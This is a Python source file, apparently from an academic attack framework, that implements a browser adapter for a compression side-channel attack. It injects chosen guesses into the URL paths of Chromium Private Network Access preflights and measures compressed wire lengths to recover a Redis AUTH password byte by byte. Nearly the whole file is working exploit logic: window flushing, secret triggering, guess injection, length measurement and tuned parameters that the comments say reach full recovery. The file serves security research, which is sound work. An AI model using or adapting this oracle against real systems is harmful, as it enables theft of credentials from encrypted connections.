"""PNA browser-injection adapter (Section 5.2, "Restricted Plaintext Injection
Oracle in CORS-PNA" remark; Section 7.1).

Sibling of ``browser.py``. Same ``setup`` / ``teardown`` / ``measure_once`` /
``default_config`` shape, constructed with ``packet_log`` + ``bridge`` exactly
like ``BrowserAdapter``. The difference is the *injection vehicle* and the
consequences that ripple out from it.

Why a separate adapter
----------------------
``browser.py`` drives a Firefox (which does **not** implement Private Network
Access) and rides the guess in the ``sendBeacon`` request **body**. A
PNA-enforcing Chromium answers the same cross-origin private->loopback request
with an **OPTIONS preflight that strips the body**, so body injection is dead.
The guess must instead ride in the preflight's **request-URI path**. Every
deviation below follows from that single change of vehicle.

The CR/LF wall
--------------
A browser emits only certain bytes verbatim in a URL path; CR (``\r``) and LF
(``\n``) cannot appear, and percent-encoding a byte (``\r`` -> ``%0D``) changes
the wire bytes and destroys the LZ77 match. The Redis AUTH secret is framed as
``...default\r\n$<len>\r\n<password>\r\n``. DEFLATE leaks byte *i* only when the
attacker can inject a >=3-byte, CR/LF-free run reproducing the buffered secret
ending at *i*. Walking the password's left context:

    length digits  left ctx ``default\r\n$``      needs \r\n   -> not leakable
    pw0            left ctx ``$<len>\r\n``         needs \r\n   -> not leakable
    pw1            left ctx ``\n pw0`` (1 anchor byte) < 2       -> not leakable
    pw2            left ctx ``pw0 pw1`` (URL-safe once known)    -> LEAKABLE
    pw3..          left ctx ``pw0 pw1 pw2 ...``                  -> LEAKABLE

So the framing + length + pw0 + pw1 sit behind the CR/LF wall and are recovered
by brute force in a real attack (seeded here; see scripts/verify_browser_pna.py
and README for the analytical bootstrap cost). Recovery of pw2..pw(n-1) is the
real, no-shortcut oracle work this adapter performs.

Deviations from browser.py (each validated for the URL-path/OPTIONS vehicle)
---------------------------------------------------------------------------
* ``known_prefix`` is the **URL-safe injectable anchor only** -- the seeded
  ``pw0 pw1`` -- not the framing (the framing is already in the buffer from the
  secret transmission and is un-injectable anyway; the 3-byte match needs only
  the 2-byte anchor plus the candidate). The harness supplies the real seed at
  run time; ``default_config`` carries a placeholder.
* ``terminator`` is ``b""``. The trailing ``\r`` cannot be injected, so there
  is no terminator stop signal; recovery is **length-bounded** via
  ``max_length``. Empty bytes is falsy, so run_attack neither appends it to the
  alphabet nor ever matches it against a committed byte.
* ``flush_pool`` is ``url_safe_disjoint`` (uppercase ``I..Z``), drawn from bytes
  that are URL-path-safe **and** disjoint from the recovery alphabet, so a
  3-byte candidate run can only back-reference the password site -- never random
  filler elsewhere in the 32 KiB window. This is what makes the short (2-byte)
  anchor safe.
* ``alignment_pool`` is the URL-safe pool (uppercase ``A..H``, see
  alignment.py), disjoint from both the recovery alphabet and the flush pool.
* ``guess_prefill_bytes`` is RE-DERIVED and much smaller than the Firefox
  16384 (see default_config). The Firefox anchor is the full ~30-byte framing,
  so its long match compresses even at a 16 KiB prefill distance; behind the
  CR/LF wall the injectable anchor is only 2 bytes (a 3-byte match), which
  saves bits over 3 literals ONLY at a short distance. A large prefill pushes
  the buffered secret out of range and the signal vanishes; a small prefill
  (~2 KiB) keeps the match close while giving the alignment sweep room to reach
  tipping points. Copying 16384 here silently fails.
* ``measurement_min_segment_size`` / ``settle`` / ``min_margin`` / ``max_rounds``
  are retuned for the preflight traffic pattern (a new TCP connection ->
  CHANNEL_OPEN + request bytes per guess), not inherited from Firefox.

measure_once ordering
---------------------
  1. Flush the 32 KiB LZ77 window via one or more preflights whose PATHS carry
     fresh ``url_safe_disjoint`` filler (chunked so no single path is oversized).
  2. Trigger the secret (POST ``{CLIENT_BASE}/send_secret``).
  3. Clear the packet log.
  4. Inject the guess as the URL path of a preflight:
     ``prefill | url_safe_anchor(prefix) | candidate | alignment``.
  5. Settle, then sum c->s wire bytes (``dport == LISTEN_PORT``), reusing
     ``direct._sum_c2s`` with a retuned ``measurement_min_segment_size``.

The guess never rides in a body: the fetch sends no body, so whether Chromium
enforces the preflight (emitting only the OPTIONS) or merely warns (emitting a
follow-up request whose request line still carries the path), the vehicle
stays the path. See attacker/exploit_pna.html.
"""

from __future__ import annotations

import asyncio
import random
from typing import TYPE_CHECKING, Any

from attacker.attack.alignment import _URL_SAFE_ALIGNMENT_POOL
from attacker.attack.config import AttackConfig, AlignmentMode
from attacker.attack.adapters.direct import CLIENT_BASE, _sum_c2s

if TYPE_CHECKING:
    import aiohttp


# Bytes a browser transmits verbatim in an OPTIONS request-URI path: printable
# ASCII (0x21..0x7E) minus the URL path-percent-encode set and the characters
# browsers percent-encode or reject. Excludes space and control bytes (hence
# CR/LF) implicitly. The path-builder asserts every guess byte is in this set,
# so a misconfigured alphabet fails loudly instead of silently corrupting the
# wire bytes via percent-encoding. (The exact set is still confirmed on the
# wire against the pinned Chromium; see the empirical validation notes.)
_MUST_PERCENT_ENCODE = frozenset(b'"#%/<>?[\\]^`{|}')
_PATH_VERBATIM_BYTES = frozenset(
    b for b in range(0x21, 0x7F) if b not in _MUST_PERCENT_ENCODE
)

# url_safe_disjoint pool: uppercase I..Z. The flush and the (random) guess
# prefill both draw from this pool. It is disjoint from the recovery alphabet
# (lowercase + digits) and the alignment pool (A..H); all bytes are 8-bit
# static-Huffman literals and URL-path-verbatim (uppercase is never
# percent-encoded).
#
# The prefill is drawn RANDOMLY (fresh per measurement), not constant. The
# guess block is not a small isolated static-Huffman block -- the HTTP request
# framing (" HTTP/1.1\r\nHost: ...") follows the guess in the same request line,
# so the guess sits in a larger block that deflate may encode with dynamic
# Huffman, where each candidate byte's code length varies. A *constant* prefill
# would freeze that per-candidate bias and a wrong candidate would win
# deterministically; a *random* prefill re-randomizes the dynamic-Huffman tree
# every measurement, so the per-candidate bias averages to zero across rounds
# while the consistent LZ77 match signal accumulates. This mirrors the Firefox
# browser adapter, whose full-entropy prefill is likewise random -- browser-class
# noise is the price, hence outlier filtering is disabled and the commit margin
# is high (see default_config and the measurement-retuning notes).
_URL_SAFE_FILLER_POOL = list(b"IJKLMNOPQRSTUVWXYZ")

# Max flush bytes per preflight. The pinned Chromium transmits a 32 KiB URL
# path verbatim in a single OPTIONS preflight, so the whole 32 KiB flush goes in
# one round-trip; the chunking loop only splits if flush_bytes exceeds this (or
# a future browser caps the path length). Each chunk's path plus its (constant)
# HTTP framing enters the shared c->s compressor and evicts the window.
_FLUSH_CHUNK_BYTES = 32768


def _assert_url_path_safe(data: bytes) -> None:
    bad = sorted({b for b in data if b not in _PATH_VERBATIM_BYTES})
    if bad:
        raise ValueError(
            "browser_pna path contains bytes that are not URL-path-verbatim "
            f"(would be percent-encoded or rejected, breaking the LZ77 match): "
            f"{[hex(b) for b in bad]}"
        )


def _url_safe_anchor(prefix: bytes) -> bytes:
    """The engine hands us ``prefix`` = the trimmed ``known_prefix + recovered``
    tail. For the URL-path vehicle it must already be URL-safe (the recovery
    alphabet is a subset of the path-verbatim set); assert that and return it
    unchanged. Raises if a caller configured a non-URL-safe alphabet, which the
    path vehicle cannot carry.
    """
    _assert_url_path_safe(prefix)
    return prefix


def _build_guess_path(
    prefill: bytes, anchor: bytes, candidate: bytes, alignment: bytes,
) -> bytes:
    """Assemble the OPTIONS request-URI path ``prefill | anchor | candidate |
    alignment`` and assert it is entirely URL-path-verbatim (no CR/LF, no byte
    the browser would percent-encode). The ``anchor | candidate`` boundary is
    where the >=3-byte LZ77 match against the buffered secret forms.
    """
    path = prefill + anchor + candidate + alignment
    _assert_url_path_safe(path)
    return path


def _make_url_safe_filler(size: int) -> bytes:
    """Fresh random uppercase-``I..Z`` filler of ``size`` bytes. Regenerated on
    every call so no cached flush leaves a persistent LZ77 bias."""
    if size <= 0:
        return b""
    return bytes(random.choices(_URL_SAFE_FILLER_POOL, k=size))


class BrowserPnaAdapter:
    def __init__(self, packet_log: Any, bridge: Any) -> None:
        self._packet_log = packet_log
        self._bridge = bridge
        self._config: AttackConfig | None = None
        self._session: "aiohttp.ClientSession | None" = None

    async def setup(
        self, config: AttackConfig, http_session: "aiohttp.ClientSession",
    ) -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        # 1. Flush the 32 KiB LZ77 window with fresh URL-safe filler, chunked
        #    across preflights. A fresh flush per measurement -- a cached flush
        #    would create a persistent LZ77 bias that averaging cannot remove.
        if cfg.flush_bytes > 0:
            remaining = cfg.flush_bytes
            while remaining > 0:
                chunk = min(remaining, _FLUSH_CHUNK_BYTES)
                await self._bridge.inject_preflight(_make_url_safe_filler(chunk))
                remaining -= chunk
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 2. Trigger the secret; it enters the shared c->s compressor before the
        #    guess.
        async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
            await r.read()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 3. Clear the packet log so only the guess preflight is measured.
        self._packet_log.clear()

        # 4. Inject the guess as the preflight's URL path. The small random
        #    prefill keeps the buffered secret within LZ77 match range of the
        #    guess (a large prefill would push it out of range and kill the
        #    short 3-byte match) while giving the alignment sweep room to reach a
        #    tipping point. The anchor|candidate boundary is where the LZ77 match
        #    against the secret forms.
        anchor = _url_safe_anchor(prefix)
        prefill = _make_url_safe_filler(cfg.guess_prefill_bytes)
        path = _build_guess_path(prefill, anchor, candidate, alignment)
        await self._bridge.inject_preflight(path)
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        # 5. Measure c->s wire bytes for the guess preflight.
        return _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            # PLACEHOLDER seed: the URL-safe injectable anchor pw0 | pw1. The
            # verify / benchmark harness overrides this per target password with
            # the real seeded pair (Section 7 seeded bootstrap). It must be
            # URL-path-safe (lowercase/digits), never the CR/LF framing.
            known_prefix=b"aa",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            # Length-bounded: max_length counts the tail bytes pw2..pw(n-1) to
            # recover. The harness sets it from the seeded password length.
            max_length=32,
            # No injectable terminator (\r is behind the CR/LF wall). Empty
            # bytes => run_attack neither appends it to the alphabet nor matches
            # it; recovery stops purely at max_length.
            terminator=b"",
            # Retuned for the preflight noise floor. Because the CR/LF wall
            # caps the injectable anchor at 2 bytes (a 3-byte match), the signal
            # depends critically on the match DISTANCE staying short (see
            # guess_prefill_bytes) and is amplified by the alignment sweep. With
            # the small prefill the correct candidate is cleanly cheapest (tens
            # of bytes per round), so a moderate margin commits in a handful of
            # rounds; the benchmark --min-margin sweep lifts it to 100% recovery.
            min_margin=128,
            max_rounds=512,
            settle=0.05,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            # [0..7] is ChaCha20-Poly1305's 8-byte padding granularity. The
            # prefill forces the guess into a small post-lit_bufsize static
            # block so alignment bytes stay 8-bit literals and every mod-8
            # residue is reachable -- exactly as in the Firefox variant, but
            # with URL-safe alignment bytes.
            alignment_lengths=list(range(8)),
            alignment_pool=bytes(_URL_SAFE_ALIGNMENT_POOL),
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=False,
            stall_detection=False,
            alignment_hint_carryover=False,
            # Disabled: the random compressible prefill makes the within-round
            # spread exceed any useful outlier threshold (a nonzero threshold
            # would discard every round and loop forever). Noise is handled by
            # averaging across rounds instead.
            outlier_threshold=0,
            flush_bytes=32768,
            flush_pool="url_safe_disjoint",
            measurement_min_segment_size=100,
            candidate_fork_on_stall=False,
            fork_top_k=5,
            max_fork_depth=2,
            # RE-DERIVED for the URL-path vehicle, and much smaller than the
            # Firefox browser's 16384. The CR/LF wall caps the injectable anchor
            # at 2 bytes, so the LZ77 match is only 3 bytes long. A 3-byte match
            # saves compressed bits over 3 literals ONLY at a SHORT distance: a
            # large (16 KiB) prefill pushes the buffered secret ~16 KiB back, at
            # which distance the match code costs as much as the literals and the
            # signal vanishes. Empirically the correct candidate is cleanly
            # cheapest around 512..2048 bytes of prefill (enough to let the
            # alignment sweep reach tipping points) and disappears by ~8 KiB.
            # 16384 -- copied from the browser adapter -- silently fails here.
            guess_prefill_bytes=2048,
            label="browser-pna-default",
        )
